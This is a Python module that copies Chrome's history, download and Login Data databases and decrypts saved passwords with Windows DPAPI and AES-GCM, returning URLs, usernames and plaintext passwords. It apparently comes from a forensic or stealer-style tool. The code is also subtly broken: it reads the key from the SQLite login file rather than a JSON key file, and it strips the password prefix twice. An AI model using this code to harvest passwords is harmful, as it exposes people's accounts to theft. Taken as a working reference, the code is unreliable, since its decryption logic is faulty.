from Cryptodome.Cipher import AES
import base64, win32crypt, os, shutil, sqlite3, json
from colorama import Fore
from datetime import timedelta, datetime

class GetChromeHistory:
    def get_browser_history(self, path, Functions):
        try:
            temp_path = os.path.join(os.getcwd(), "ChromeHistory")
            shutil.copy2(path, temp_path)
            Functions.saveLog(f"{path} : Copied to {temp_path}")

            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()

            cursor.execute("""
            SELECT url, title, visit_count, last_visit_time
            FROM urls
            ORDER BY last_visit_time DESC
            """)

            rows = cursor.fetchall()
            history = []

            for row in rows:
                url = row[0]
                title = row[1]
                visit_count = row[2]
                last_visit_time = datetime(1601, 1, 1) + timedelta(microseconds=row[3])

                history.append({
                    "number": 2,
                    "URL": url,
                    "Title": title,
                    "Visit Count": visit_count,
                    "Last Visit Time": last_visit_time
                })

            cursor.close()
            conn.close()
            os.remove(temp_path)
            Functions.saveLog(f"{path} : Removed {temp_path}")
            return history
        except PermissionError:
            Functions.saveLog(f"{path} : Permission denied")
            print(f'{Fore.RED}Permission denied! File Path: {path}{Fore.RESET}')
            return [{"Error": "Permission denied"}]
        except FileNotFoundError:
            Functions.saveLog(f"{path} : File not found")
            print(f'{Fore.RED}File not found! File Path: {path}{Fore.RESET}')
            return [{"Error": "File not found"}]
        except Exception as e:
            Functions.saveLog(f"Error: {path} : {e}")
            print(f"{Fore.RED}Error: {path} : {e}{Fore.RESET}")
            return [{"Error": e}]

class GetChromeDownloadHistory:
    def get_browser_download_history(self, path, Functions):
        try:
            temp_path = os.path.join(os.getcwd(), "ChromeHistory")
            shutil.copy2(path, temp_path)
            Functions.saveLog(f"{path} : Copied to {temp_path}")

            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()

            cursor.execute("""
            SELECT downloads.id, downloads.target_path, downloads.start_time, downloads.received_bytes, downloads.total_bytes, downloads_url_chains.url
            FROM downloads
            JOIN downloads_url_chains ON downloads.id = downloads_url_chains.id
            ORDER BY downloads.start_time DESC
            """)

            rows = cursor.fetchall()
            downloads = []

            for row in rows:
                download_id = row[0]
                file_path = row[1]
                start_time = datetime(1601, 1, 1) + timedelta(microseconds=row[2])
                received_bytes = row[3]
                total_bytes = row[4]
                source_url = row[5]

                received_mb = Functions.bytes_to_mb(received_bytes)
                total_mb = Functions.bytes_to_mb(total_bytes)

                downloads.append({
                    "number": 2,
                    "File Path": file_path,
                    "Start Time": start_time,
                    "Received MB": received_mb,
                    "Total MB": total_mb,
                    "Downlaod ID": download_id,
                    "Source URL": source_url
                })

            cursor.close()
            conn.close()
            os.remove(temp_path)
            Functions.saveLog(f"{path} : Removed {temp_path}")

            return downloads
        except PermissionError:
            Functions.saveLog(f"{path} : Permission denied")
            print(f'{Fore.RED}Permission denied! File Path: {path}{Fore.RESET}')
            return [{"Error": "Permission denied"}]
        except FileNotFoundError:
            Functions.saveLog(f"{path} : File not found")
            print(f'{Fore.RED}File not found! File Path: {path}{Fore.RESET}')
            return [{"Error": "File not found"}]
        except Exception as e:
            Functions.saveLog(f"Error: {path} : {e}")
            print(f"{Fore.RED}Error: {path} : {e}{Fore.RESET}")
            return [{"Error": e}]

class GetChromeCookies:
    pass

class GetChromeCache:
    pass

class GetChromeLoginData:
    def decrypt_password(self, encrypted_password, key):
        try:
            iv = encrypted_password[3:15]
            payload = encrypted_password[15:]
            cipher = AES.new(key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)[:-16].decode()
            return decrypted_pass
        except Exception as e:
            return f"Decryption error: {str(e)}"

    def get_chrome_key(self, temp_path):
        with open(temp_path, "r", encoding="ISO-8859-1", errors="ignore") as loginDataFile:
            loginData = json.load(loginDataFile)

        encryptedLoginData = base64.b64decode(loginData['os_crypt']['encrypted_key'])[5:]
        decrypted_key = win32crypt.CryptUnprotectData(encryptedLoginData, None, None, None, 0)[1]

        return decrypted_key

    def get_login_data(self, path, Functions):
        try:
            temp_path = os.path.join(os.getcwd(), "LoginData")
            shutil.copy2(path, temp_path)
            Functions.saveLog(f"{path} : Copied to {temp_path}")

            conn = sqlite3.connect(temp_path)
            cursor = conn.cursor()

            cursor.execute("""
            SELECT origin_url, username_value, password_value
            FROM logins
            """)

            rows = cursor.fetchall()
            logins = []

            key = self.get_chrome_key(temp_path)

            for row in rows:
                origin_url = row[0]
                username = row[1]
                encrypted_password = row[2]

                if encrypted_password:
                    try:
                        encrypted_password = encrypted_password[3:]
                        password = self.decrypt_password(encrypted_password, key)
                    except Exception as e:
                        password = "Password decryption error: " + str(e)
                else:
                    password = ""

                logins.append({
                    "Origin URL": origin_url,
                    "Username": username,
                    "Password": password
                })

            cursor.close()
            conn.close()
            os.remove(temp_path)

            Functions.saveLog(f"{path} : Removed {temp_path}")
            return logins
        except PermissionError:
            Functions.saveLog(f"{path} : Permission denied")
            print(f'{Fore.RED}Permission denied! File Path: {path}{Fore.RESET}')
            return [{"Error": "Permission denied"}]
        except FileNotFoundError:
            Functions.saveLog(f"{path} : File not found")
            print(f'{Fore.RED}File not found! File Path: {path}{Fore.RESET}')
            return [{"Error": "File not found"}]
        except Exception as e:
            Functions.saveLog(f"Error: {path} : {e}")
            print(f"{Fore.RED}Error: {path} : {e}{Fore.RESET}")
            return [{"Error": e}]
